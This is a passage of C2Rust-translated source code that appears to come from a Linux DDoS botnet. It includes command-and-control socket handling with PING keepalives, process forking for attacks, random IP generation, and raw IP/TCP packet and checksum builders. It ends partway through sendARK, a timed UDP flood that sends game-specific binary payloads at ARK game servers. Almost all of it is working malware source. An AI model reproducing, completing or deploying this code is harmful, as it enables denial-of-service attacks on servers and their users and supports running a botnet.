pub unsafe extern "C" fn uppercase(mut str: *mut libc::c_uchar) {
    while *str != 0 {
        *str = mytoupper(*str as libc::c_int) as libc::c_uchar;
        str = str.offset(1);
    }
}
#[no_mangle]
pub unsafe extern "C" fn RandString(
    mut buf: *mut libc::c_uchar,
    mut length: libc::c_int,
) {
    let mut i_0: libc::c_int = 0 as libc::c_int;
    i_0 = 0 as libc::c_int;
    while i_0 < length {
        *buf
            .offset(
                i_0 as isize,
            ) = (rand_cmwc())
            .wrapping_rem((91 as libc::c_int - 65 as libc::c_int) as libc::c_uint)
            .wrapping_add(65 as libc::c_int as libc::c_uint) as libc::c_uchar;
        i_0 += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn RandBytes(
    mut buf: *mut libc::c_uchar,
    mut length: libc::c_int,
) {
    let mut i_0: libc::c_int = 0 as libc::c_int;
    i_0 = 0 as libc::c_int;
    while i_0 < length {
        *buf
            .offset(
                i_0 as isize,
            ) = (rand_cmwc()).wrapping_rem(256 as libc::c_int as libc::c_uint)
            as libc::c_uchar;
        i_0 += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn recvLine(
    mut buf: *mut libc::c_uchar,
    mut bufsize: libc::c_int,
) -> libc::c_int {
    memset(buf as *mut libc::c_void, 0 as libc::c_int, bufsize as libc::c_ulong);
    let mut myset: fd_set = fd_set { __fds_bits: [0; 16] };
    let mut errors: fd_set = fd_set { __fds_bits: [0; 16] };
    let mut tv: timeval = timeval { tv_sec: 0, tv_usec: 0 };
    tv.tv_sec = 7 as libc::c_int as __time_t;
    tv.tv_usec = 0 as libc::c_int as __suseconds_t;
    let mut __d0: libc::c_int = 0;
    let mut __d1: libc::c_int = 0;
    let fresh25 = &mut __d0;
    let fresh26;
    let fresh27 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
        .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
    let fresh28 = &mut __d1;
    let fresh29;
    let fresh30 = &mut *(myset.__fds_bits).as_mut_ptr().offset(0 as libc::c_int as isize)
        as *mut __fd_mask;
    asm!(
        "cld; rep; stosq", inlateout("cx") c2rust_asm_casts::AsmCast::cast_in(fresh25,
        fresh27) => fresh26, inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh28,
        fresh30) => fresh29, inlateout("ax") 0 as libc::c_int => _,
        options(preserves_flags)
    );
    c2rust_asm_casts::AsmCast::cast_out(fresh25, fresh27, fresh26);
    c2rust_asm_casts::AsmCast::cast_out(fresh28, fresh30, fresh29);
    let mut __d0_0: libc::c_int = 0;
    let mut __d1_0: libc::c_int = 0;
    let fresh31 = &mut __d0_0;
    let fresh32;
    let fresh33 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
        .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
    let fresh34 = &mut __d1_0;
    let fresh35;
    let fresh36 = &mut *(errors.__fds_bits)
        .as_mut_ptr()
        .offset(0 as libc::c_int as isize) as *mut __fd_mask;
    asm!(
        "cld; rep; stosq", inlateout("cx") c2rust_asm_casts::AsmCast::cast_in(fresh31,
        fresh33) => fresh32, inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh34,
        fresh36) => fresh35, inlateout("ax") 0 as libc::c_int => _,
        options(preserves_flags)
    );
    c2rust_asm_casts::AsmCast::cast_out(fresh31, fresh33, fresh32);
    c2rust_asm_casts::AsmCast::cast_out(fresh34, fresh36, fresh35);
    myset
        .__fds_bits[(fd_cnc
        / (8 as libc::c_int
            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong as libc::c_int))
        as usize]
        |= ((1 as libc::c_ulong)
            << fd_cnc
                % (8 as libc::c_int
                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                        as libc::c_int)) as __fd_mask;
    errors
        .__fds_bits[(fd_cnc
        / (8 as libc::c_int
            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong as libc::c_int))
        as usize]
        |= ((1 as libc::c_ulong)
            << fd_cnc
                % (8 as libc::c_int
                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                        as libc::c_int)) as __fd_mask;
    let mut selectRtn: libc::c_int = 0;
    let mut retryCount: libc::c_int = 0;
    let mut dataAvailable: libc::c_int = 0;
    selectRtn = select(
        fd_cnc + 1 as libc::c_int,
        &mut myset,
        0 as *mut fd_set,
        &mut errors,
        &mut tv,
    );
    if selectRtn <= 0 as libc::c_int {
        if errors
            .__fds_bits[(fd_cnc
            / (8 as libc::c_int
                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong as libc::c_int))
            as usize]
            & ((1 as libc::c_ulong)
                << fd_cnc
                    % (8 as libc::c_int
                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                            as libc::c_int)) as __fd_mask
            != 0 as libc::c_int as libc::c_long
        {
            return -(1 as libc::c_int);
        }
        while retryCount < 10 as libc::c_int {
            sockprintf(
                fd_cnc,
                b"PING\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
            );
            tv.tv_sec = 30 as libc::c_int as __time_t;
            tv.tv_usec = 0 as libc::c_int as __suseconds_t;
            let mut __d0_1: libc::c_int = 0;
            let mut __d1_1: libc::c_int = 0;
            let fresh37 = &mut __d0_1;
            let fresh38;
            let fresh39 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
            let fresh40 = &mut __d1_1;
            let fresh41;
            let fresh42 = &mut *(myset.__fds_bits)
                .as_mut_ptr()
                .offset(0 as libc::c_int as isize) as *mut __fd_mask;
            asm!(
                "cld; rep; stosq", inlateout("cx")
                c2rust_asm_casts::AsmCast::cast_in(fresh37, fresh39) => fresh38,
                inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh40, fresh42) =>
                fresh41, inlateout("ax") 0 as libc::c_int => _, options(preserves_flags)
            );
            c2rust_asm_casts::AsmCast::cast_out(fresh37, fresh39, fresh38);
            c2rust_asm_casts::AsmCast::cast_out(fresh40, fresh42, fresh41);
            let mut __d0_2: libc::c_int = 0;
            let mut __d1_2: libc::c_int = 0;
            let fresh43 = &mut __d0_2;
            let fresh44;
            let fresh45 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
            let fresh46 = &mut __d1_2;
            let fresh47;
            let fresh48 = &mut *(errors.__fds_bits)
                .as_mut_ptr()
                .offset(0 as libc::c_int as isize) as *mut __fd_mask;
            asm!(
                "cld; rep; stosq", inlateout("cx")
                c2rust_asm_casts::AsmCast::cast_in(fresh43, fresh45) => fresh44,
                inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh46, fresh48) =>
                fresh47, inlateout("ax") 0 as libc::c_int => _, options(preserves_flags)
            );
            c2rust_asm_casts::AsmCast::cast_out(fresh43, fresh45, fresh44);
            c2rust_asm_casts::AsmCast::cast_out(fresh46, fresh48, fresh47);
            myset
                .__fds_bits[(fd_cnc
                / (8 as libc::c_int
                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                        as libc::c_int)) as usize]
                |= ((1 as libc::c_ulong)
                    << fd_cnc
                        % (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as __fd_mask;
            errors
                .__fds_bits[(fd_cnc
                / (8 as libc::c_int
                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                        as libc::c_int)) as usize]
                |= ((1 as libc::c_ulong)
                    << fd_cnc
                        % (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as __fd_mask;
            selectRtn = select(
                fd_cnc + 1 as libc::c_int,
                &mut myset,
                0 as *mut fd_set,
                &mut errors,
                &mut tv,
            );
            if selectRtn <= 0 as libc::c_int {
                if errors
                    .__fds_bits[(fd_cnc
                    / (8 as libc::c_int
                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                            as libc::c_int)) as usize]
                    & ((1 as libc::c_ulong)
                        << fd_cnc
                            % (8 as libc::c_int
                                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                    as libc::c_int)) as __fd_mask
                    != 0 as libc::c_int as libc::c_long
                {
                    return -(1 as libc::c_int);
                }
                retryCount += 1;
            } else {
                if errors
                    .__fds_bits[(fd_cnc
                    / (8 as libc::c_int
                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                            as libc::c_int)) as usize]
                    & ((1 as libc::c_ulong)
                        << fd_cnc
                            % (8 as libc::c_int
                                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                    as libc::c_int)) as __fd_mask
                    != 0 as libc::c_int as libc::c_long
                {
                    return -(1 as libc::c_int);
                }
                break;
            }
        }
    }
    if errors
        .__fds_bits[(fd_cnc
        / (8 as libc::c_int
            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong as libc::c_int))
        as usize]
        & ((1 as libc::c_ulong)
            << fd_cnc
                % (8 as libc::c_int
                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                        as libc::c_int)) as __fd_mask != 0 as libc::c_int as libc::c_long
    {
        return -(1 as libc::c_int);
    }
    ioctl(
        fd_cnc,
        0x541b as libc::c_int as libc::c_ulong,
        &mut dataAvailable as *mut libc::c_int,
    );
    if dataAvailable != 0 {
        let mut tmpchr: libc::c_uchar = 0;
        let mut cp: *mut libc::c_uchar = 0 as *mut libc::c_uchar;
        let mut count: libc::c_int = 0 as libc::c_int;
        cp = buf;
        loop {
            let fresh49 = bufsize;
            bufsize = bufsize - 1;
            if !(fresh49 > 1 as libc::c_int) {
                break;
            }
            if recv(
                fd_cnc,
                &mut tmpchr as *mut libc::c_uchar as *mut libc::c_void,
                1 as libc::c_int as size_t,
                0 as libc::c_int,
            ) == 0 as libc::c_int as libc::c_long
            {
                *cp = 0 as libc::c_int as libc::c_uchar;
                return -(1 as libc::c_int);
            }
            let fresh50 = cp;
            cp = cp.offset(1);
            *fresh50 = tmpchr;
            if tmpchr as libc::c_int == '\n' as i32 {
                break;
            }
            count += 1;
        }
        *cp = 0 as libc::c_int as libc::c_uchar;
        return count;
    } else {
        return 0 as libc::c_int
    };
}
#[no_mangle]
pub unsafe extern "C" fn listFork() -> libc::c_int {
    let mut parent: uint32_t = 0;
    let mut newpids: *mut uint32_t = 0 as *mut uint32_t;
    let mut i_0: uint32_t = 0;
    parent = fork() as uint32_t;
    if parent <= 0 as libc::c_int as libc::c_uint {
        return parent as libc::c_int;
    }
    numpids = numpids.wrapping_add(1);
    newpids = malloc(
        numpids
            .wrapping_add(1 as libc::c_int as libc::c_ulong)
            .wrapping_mul(4 as libc::c_int as libc::c_ulong),
    ) as *mut uint32_t;
    i_0 = 0 as libc::c_int as uint32_t;
    while (i_0 as libc::c_ulong)
        < numpids.wrapping_sub(1 as libc::c_int as libc::c_ulong)
    {
        *newpids.offset(i_0 as isize) = *pids.offset(i_0 as isize);
        i_0 = i_0.wrapping_add(1);
    }
    *newpids
        .offset(
            numpids.wrapping_sub(1 as libc::c_int as libc::c_ulong) as isize,
        ) = parent;
    free(pids as *mut libc::c_void);
    pids = newpids;
    return parent as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn GetRandomIP(mut netmask: in_addr_t) -> in_addr_t {
    let mut tmp: in_addr_t = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ rand_cmwc() & !netmask;
}
#[no_mangle]
pub unsafe extern "C" fn csum(
    mut buf: *mut libc::c_ushort,
    mut count: libc::c_int,
) -> libc::c_ushort {
    let mut sum: uint64_t = 0 as libc::c_int as uint64_t;
    while count > 1 as libc::c_int {
        let fresh51 = buf;
        buf = buf.offset(1);
        sum = (sum as libc::c_ulong).wrapping_add(*fresh51 as libc::c_ulong) as uint64_t
            as uint64_t;
        count -= 2 as libc::c_int;
    }
    if count > 0 as libc::c_int {
        sum = (sum as libc::c_ulong)
            .wrapping_add(*(buf as *mut libc::c_uchar) as libc::c_ulong) as uint64_t
            as uint64_t;
    }
    while sum >> 16 as libc::c_int != 0 {
        sum = (sum & 0xffff as libc::c_int as libc::c_ulong)
            .wrapping_add(sum >> 16 as libc::c_int);
    }
    return !sum as uint16_t;
}
#[no_mangle]
pub unsafe extern "C" fn tcpcsum(
    mut iph: *mut iphdr,
    mut tcph: *mut tcphdr,
) -> libc::c_ushort {
    let mut pseudohead: tcp_pseudo = tcp_pseudo {
        src_addr: 0,
        dst_addr: 0,
        zero: 0,
        proto: 0,
        length: 0,
    };
    let mut total_len: libc::c_ushort = (*iph).tot_len;
    pseudohead.src_addr = (*iph).saddr as libc::c_ulong;
    pseudohead.dst_addr = (*iph).daddr as libc::c_ulong;
    pseudohead.zero = 0 as libc::c_int as libc::c_uchar;
    pseudohead.proto = IPPROTO_TCP as libc::c_int as libc::c_uchar;
    pseudohead
        .length = ((::std::mem::size_of::<tcphdr>() as libc::c_ulong as libc::c_ushort
        as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
        | (::std::mem::size_of::<tcphdr>() as libc::c_ulong as libc::c_ushort
            as libc::c_int & 0xff00 as libc::c_int) >> 8 as libc::c_int)
        as libc::c_ushort;
    let mut totaltcp_len: libc::c_int = (::std::mem::size_of::<tcp_pseudo>()
        as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<tcphdr>() as libc::c_ulong) as libc::c_int;
    let mut tcp_0: *mut libc::c_ushort = malloc(totaltcp_len as libc::c_ulong)
        as *mut libc::c_ushort;
    memcpy(
        tcp_0 as *mut libc::c_uchar as *mut libc::c_void,
        &mut pseudohead as *mut tcp_pseudo as *const libc::c_void,
        ::std::mem::size_of::<tcp_pseudo>() as libc::c_ulong,
    );
    memcpy(
        (tcp_0 as *mut libc::c_uchar)
            .offset(::std::mem::size_of::<tcp_pseudo>() as libc::c_ulong as isize)
            as *mut libc::c_void,
        tcph as *mut libc::c_uchar as *const libc::c_void,
        ::std::mem::size_of::<tcphdr>() as libc::c_ulong,
    );
    let mut output: libc::c_ushort = csum(tcp_0, totaltcp_len);
    free(tcp_0 as *mut libc::c_void);
    return output;
}
#[no_mangle]
pub unsafe extern "C" fn makeIPPacket(
    mut iph: *mut iphdr,
    mut dest_0: uint32_t,
    mut source_0: uint32_t,
    mut protocol: uint8_t,
    mut packetSize: libc::c_int,
) {
    (*iph).set_ihl(5 as libc::c_int as libc::c_uint);
    (*iph).set_version(4 as libc::c_int as libc::c_uint);
    (*iph).tos = 0 as libc::c_int as uint8_t;
    (*iph)
        .tot_len = (::std::mem::size_of::<iphdr>() as libc::c_ulong)
        .wrapping_add(packetSize as libc::c_ulong) as uint16_t;
    (*iph).id = rand_cmwc() as uint16_t;
    (*iph).frag_off = 0 as libc::c_int as uint16_t;
    (*iph).ttl = 255 as libc::c_int as uint8_t;
    (*iph).protocol = protocol;
    (*iph).check = 0 as libc::c_int as uint16_t;
    (*iph).saddr = source_0;
    (*iph).daddr = dest_0;
}
#[no_mangle]
pub unsafe extern "C" fn sclose(mut fd: libc::c_int) -> libc::c_int {
    if 3 as libc::c_int > fd {
        return 1 as libc::c_int;
    }
    close(fd);
    return 0 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn socket_connect(
    mut host: *mut libc::c_char,
    mut port: uint16_t,
) -> libc::c_int {
    let mut addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut on: libc::c_int = 1 as libc::c_int;
    let mut sock: libc::c_int = 0;
    if getHost(host as *mut libc::c_uchar, &mut addr.sin_addr) != 0 {
        return -(1 as libc::c_int);
    }
    addr
        .sin_port = ((port as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
        | (port as libc::c_int & 0xff00 as libc::c_int) >> 8 as libc::c_int)
        as in_port_t;
    addr.sin_family = 2 as libc::c_int as sa_family_t;
    sock = socket(
        2 as libc::c_int,
        SOCK_STREAM as libc::c_int,
        IPPROTO_TCP as libc::c_int,
    );
    setsockopt(
        sock,
        IPPROTO_TCP as libc::c_int,
        1 as libc::c_int,
        &mut on as *mut libc::c_int as *const libc::c_char as *const libc::c_void,
        ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
    );
    if sock == -(1 as libc::c_int) {
        return 0 as libc::c_int;
    }
    if connect(
        sock,
        &mut addr as *mut sockaddr_in as *mut sockaddr,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
    ) == -(1 as libc::c_int)
    {
        return 0 as libc::c_int;
    }
    return sock;
}
#[no_mangle]
pub unsafe extern "C" fn sendARK(
    mut host: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut secs: libc::c_int,
) {
    let mut a: libc::c_int = 0 as libc::c_int;
    let mut start: libc::c_int = time(0 as *mut time_t) as libc::c_int;
    let mut sockfd: libc::c_int = 0;
    let mut portno: libc::c_int = 0;
    let mut n: libc::c_int = 0;
    let mut serverlen: libc::c_int = 0;
    let mut serveraddr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    sockfd = socket(2 as libc::c_int, SOCK_DGRAM as libc::c_int, 0 as libc::c_int);
    if sockfd < 0 as libc::c_int {
        return;
    }
    bzero(
        &mut serveraddr as *mut sockaddr_in as *mut libc::c_char as *mut libc::c_void,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    serveraddr.sin_family = 2 as libc::c_int as sa_family_t;
    if getHost(host, &mut serveraddr.sin_addr) != 0 {
        return;
    }
    serveraddr
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    serverlen = ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as libc::c_int;
    let mut randstrings: [*mut libc::c_char; 15] = [
        b"\xA0\xDC\x94oZ)\x07\04\x04\xB9\xA9'\x06h\xF7\x04\x9D\0\0\0\xBC\x1C\x85\xB5\x95\xBD4\xBD\x91\xCD\xBDP\xA1\x95\r\x95\xB9\xD1\x95\xC9\xBDP\xA1\x95\r\x95\xB9\xD1\x95\xC9}\t\x95\x85\x8D\xA1\x05\xC5\0\0\0\0\0\xF4\xCC\0\xED\xC6\xA0\x15\0\0\x80\x97\xA3\xB0\xB6\xB2\x97\xA67\xB2\xB9\x17*\xB4\xB2\xA127\xBA2\xB9\x17*\xB4\xB2\xA127\xBA2\xB9/\xA1\xB2\xB01\xB4\xA0\x18\xA7\xB209\0\0\0\0\x80\x9E\x18\xA0\xDD\x13t\x02\0\0\xF0r\x14\xD6V\xF6\xD2\xF4F6\xF7B\x85V6T\xE6FW&\xF7B\x85V6T\xE6FW&\xF7%T\x166\x86\x16$\x03\0\0\0\0\xD03\x03\xB4\x1B\x83V\0\0\0^\x8E\xC2\xDA\xCA^\x9A\xDE\xC8\xE6^\xA8\xD0\xCA\x86\xCA\xDC\xE8\xCA\xE4^\xA8\xD0\xCA\x86\xCA\xDC\xE8\xCA\xE4\xBE\x84\xCA\xC2\xC6\xD0\x82d\x9C\xCA\xC2\xE4\0\0\0\0\0zi\x80vf\x90\x0B\0\0\xC0\xCBQX[\xD9K\xD3\x1B\xD9\xDC\x0B\x15Z\xD9P\x99\x1B]\x99\xDC\x0B\x15Z\xD9P\x99\x1B]\x99\xDC\x17S\x98]\x98P\xD8\xD8\xDA\x99\xDC[\x9D\x1B\x19\0\0\0\0@\xAF\x0C\xD0N\x0CR\x01\0\0x9\nk+{iz#\x9B{\xA1B+\x1B*s\xA3+\x93{\xA1B+\x1B*s\xA3+\x93\xFB\x92J\xB3+\x93sz\x93\xA3C\x03\0\0\0\0\xB8\xC5\xECb~1\xC3\x98\x07\xFA\x95!\xC6\x98e\xCC3f\x1As\x8D\xD9\xC6|c\xC61\xE7\x98u\xCC;f\x1Es\x8F\xD9\xC7\xFCc\x062\r2\x0B\x99\x87\xCCD\xE6\"\xB3\x91\xF9\xC8\x8CdN2+\x99\x97\xCCL\xE6&\xB3\x93\xF9\xC9\x0Ce\x1Ae\x962O\x99\xA9\xCCUf+\xF3\x95\x19\xCB\x9Ce\xD62o\x99\xB9\xCC]f/\xF3\x97\x19\xCC4\xCC,f\x1E3\x93\x99\xCB\xCCf\xE633\x9A9\xCD\xACf^3\xB3\x99\xDB\xCCn\xE673\x9Ci\x9CY\xCE<g\xA63\xD7\x99\xED\xCCwf<s\x9EY\xCF\xBCg\xE63\xF7\x99\xFD\xCC\x7Ff@\xD3@\xB3\xA0y\xD0Lh\x06\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\xA0\xDC\x94o[\xE9B3\x8Ci\x8CY\xC6<c\xA61\xD7\x98m\xCC7f\x1Cs\x8EY\xC7\xBCc\xE61\xF7\x98}\xCC?f \xD3 \xB3\x90y\xC8Ld.2\x1B\x99\x8F\xCCH\xE6$\xB3\x92y\xC9\xCCdn2;\x99\x9F\xCCP\xA6Qf)\xF3\x94\x99\xCA\\e\xB62_\x99\xB1\xCCYf-\xF3\x96\x99\xCB\xDCe\xF62\x7F\x99\xC1L\xC3\xCCb\xE613\x99\xB9\xCClf>3\xA3\x99\xD3\xCCj\xE653\x9B\xB9\xCD\xECf~3\xC3\x99\xC6\x99\xE5\xCCsf:s\x9D\xD9\xCE|g\xC63\xE7\x99\xF5\xCC{f>s\x9F\xD9\xCF\xFCg\x064\r4\x0B\x9A\x07\xCD\x84\xE6B\xB3\xA1\xF9\xD0\x8ChN4+\x9A\x17\xCD\x8C\xE6F\xB3\xA3\xF9\xD1\x0Ci\x1Ai\x964O\x9A/\xCD\x9AfTs\xAAY\xD5\x84\x03\x80\x86\0\xE1\x93\x02\xE0V\0\x1F\x05\x9E\x1A\xAD\xF8\x98\xE1I\xAB\n\xF3\xF0\xEF`e\x96\x11\0`\xDCe\x18\t\0\x80\x01\x01\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\xA0\xDC\x94oY)\x07\00\x045\xBC'\x06h\xF7\x04\x9D\0\0\0\xBC\x1C\x85\xB5\x95\xBD4\xBD\x91\xCD\xBDP\xA1\x95\r\x95\xB9\xD1\x95\xC9\xBDP\xA1\x95\r\x95\xB9\xD1\x95\xC9}1\x85\xD9\x85\x19\x85\xC9\x01\0\0\0\0\xF0\xC6\0\xED\xC0 \x14\0\0\x80\x97\xA3\xB0\xB6\xB2\x97\xA67\xB2\xB9\x17*\xB4\xB2\xA127\xBA2\xB9\x17*\xB4\xB2\xA127\xBA2\xB9/\xA60\xBB0\xA7\xB209\0\0\0\0\0^\x19\xA0\x9D\x18\xA4\x02\0\0\xF0r\x14\xD6V\xF6\xD2\xF4F6\xF7B\x85V6T\xE6FW&\xF7B\x85V6T\xE6FW&\xF74V\x16\xE6\xE6\xF4\xE5T\x16&\x07\0\0\0\0\xC03\x03\xB4\x1B\x83V\0\0\0^\x8E\xC2\xDA\xCA^\x9A\xDE\xC8\xE6^\xA8\xD0\xCA\x86\xCA\xDC\xE8\xCA\xE4^\xA8\xD0\xCA\x86\xCA\xDC\xE8\xCA\xE4\x9E\xC6\xCA\xC2\xDC\x9C\xBE\x9C\xCA\xC2\xE4\x84\0\0\0\0\0xb\x80vO\xD0\t\0\0\xC0\xCBQX[\xD9K\xD3\x1B\xD9\xDC\x0B\x15Z\xD9P\x99\x1B]\x99\xDC\x0B\x15Z\xD9P\x99\x1B]\x99\xDCWP\xCC\x97Q\x98\x9C\x10\0\0\0\0@O\x0C\xD0\xEE\t:\x01\0\0x9\nk+{iz#\x9B{\xA1B+\x1B*s\xA3+\x93{\xA1B+\x1B*s\xA3+\x93\xFB\n\x8A\xF9r*\x0B\x93\x03\0\0\0\0\xE8\x8D\x01\xDA\x81A(\0\0\0/Game/Mods/TheCenter/TheCenter_A1_NearB\0\0\0\0\0\xBD0@;'\xC8\x04\0\0\xE0\xE5(\xAC\xAD\xEC\xA5\xE9\x8Dl\xEE\x85\n\xADl\xA8\xCC\x8D\xAEL\xEE\x85\n\xADl\xA8\xCC\x8D\xAEL\xEEK(\xE6\xCB(L\x0E\0\0\0\0\xA0'\x06h\xF7\x04\x9D\0\0\0\xBC\x1C\x85\xB5\x95\xBD4\xBD\x91\xCD\xBDP\xA1\x95\r\x95\xB9\xD1\x95\xC9\xBDP\xA1\x95\r\x95\xB9\xD1\x95\xC9}\t\xC5|\x19\x85\xC9\t\x01\0\0\0\0\x0C\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\xFD\xE2\xF96\xC8\x02\x07\08\0m\x80\"U\x018\0\xE0\x01\xC8\"L Hy-0\0\0\0\xC0\x99u\0 \x02\0\0\0J.\xAD-\x8C-\xC9\xCD\xAE\xCC\x8D\xEEM./\x06\xC0\xDDDo\xE27\x11\x9C0\x9C(N\x1C'\x02\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\xFD\xE2\xF96\xC8\x02\x07\08\0m\x80\"U\x018\0\xE0\x01\xC8\"L Hy-0\0\0\0\xC0\x99u\0 \x02\0\0\0J.\xAD-\x8C-\xC9\xCD\xAE\xCC\x8D\xEEM./\x06\xC0\xDDDo\xE27\x11\x9C0\x9C(N\x1C'\x02\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"#\x80'3\xEEV\x1D\xED\x8E\x96G\xDB\xA3\xF5\xD1\xFEh\x1C\0\xB0\x04d\x11&\x10\xA4\xBC\x16\x18\0\0\0\xA0\xD66\0\x10\x01\0\0\0%\x97\xD6\x16\xC6\x96\xE4fW\xE6F\xF7&\x97\x17\x03` -@\x12Qy\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"<\\\xA0\x99\x03\xC2\x83\x81\x17a%bG}\xDE\x96\xC1U}\x93\x8D\x91\x7FF\x07\0\0\0\xB2\xF7\xC5`\x8C\xD0\xCA\xA5\xE7\xF9@\xCA\x05\x7FR;\xB5\xA4\xFBI\x91\x0F\x05o\xA6J\xFAc\x03}\xBE\xC0\x13b\x01\xB7\xF5O\xA4\xFF\xBA\x13\"~7\x11\xF8\xA4B-\x95\x1D\xB1\x02\0\0\xEAC\xBFa\xB32\xEA+\x94s\xFA\xFC\x96k\x8E\rs \x87\xCC\x8Dbo\x0F\xAFD)\t{S\x81l\xD6SD\xB7]\xEF\xAD7\x98*\xCD\xDDz\xC1\x08\xB7<\\\xA0\x99\xE2\xAF#.a\x97\x7F\x8E\x9A\xA0\x8C\x9C\xB0\xED\x0E\x93\x05\xF8\xDC\xE2\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\xFD\xE2\xF96\x0E\xCC,\xA8\x16t\x0BR\x01\0\x18\x80\0@\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"\x13\x8Di\x19\x06@\x01\xE0\0\x90\0X\04\0\x1E\0\x11\x80\t@\x05\xE0\x02\x90\x01\xD8\0t\0>\0!\0#\x80\x12\xC0\t \x05\xB0\x02h\x01\xBC\0b\03\x80\x1A\xC0\r \x07\xB0\x03\xE8\x01\xFC\0\x82\0\x86\0E\0\x0E\0\x08\0\xF2kE\xC2\0xi\x80vf\x90\x0B\0\0\xC0\xCBQX[\xD9KS\x18\xDC\xDC\x0B\x15ZY\xD2\x1C[\x98\x1B\xD9T\x9DXS\x18\xDC\xDC\x0BS\x98\x1B\xD9\xDCX\x18\\\xD9T\x9D\x18[\x99]\x19\x1B\0\0\0\0@\x0F\r\xD0\xAE\x0Cj\x01\0\0x9\nk+{i\n\x83\x9B{\xA1B+K\x9Ac\x0Bs#\x9B\xAA\x13k\n\x83\x9B{i\n\x9B\xA3+\x93K\x12b\x1A\n\x83\xA3\xAB\x93+\x03\0\0\0\0\xE8\xA5\x01\xDA\x99A.\0\0\0/Game/Maps/TheIslandSubMaps/MasterIBLCaptures\0\0\0\0\0\xBD2@;1H\x05\0\0\xE0\xE5(\xAC\xAD\xEC\xA5)\x0Cn\xEE\x85\n\xAD,i\x8E-\xCC\x8Dl\xAAN\xAC)\x0Cn\xEE\xA5)l\x8E\xAEL.I\x88i\xCA\xED\xED\x0E\0\0\0\0\xA0\x07\x06h\xD7\x04\x95\0\0\0\xBC\x1C\x85\xB5\x95\xBD4\x85\xC1\xCD\xBDP\xA1\x95%\xCD\xB1\x85\xB9\x91M\xD5\x895\x85\xC1\xCD\xBD<\x89\x95\xB1\xA5\xCD\xAD\xCD\x01\0\0\0\0\xF4\x04\x01\xED\xDE\xA0\x1B\0\0\x80\x97\xA3\xB0\xB6\xB2\x97\xA60\xB8\xB9\x17*\xB4\xB2\xA49\xB607\xB2\xA9:\xB1\xA60\xB8\xB9\x17\xA82\xB9\xB9\xB49\xBA27\xBA\xA3\xB0\xB628\xB6\xB0\xBC\xA9:1\xB62\xBB26\0\0\0\0\x80^\"\xA0\x9D!\xE4\x03\0\0\xF0r\x14\xD6V\xF6\xD2\x14\x067\xF7B\x85V\x964\xC7\x16\xE6F6U'\xD6\x14\x067\xF7\x02U&7\x976GW\xE6Fw\x14\xD6V\x06\xC7\x16\x967U'\xC6VfW\xC6\xF6%\x94\xF6\xD6V6\x07\0\0\0\00\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
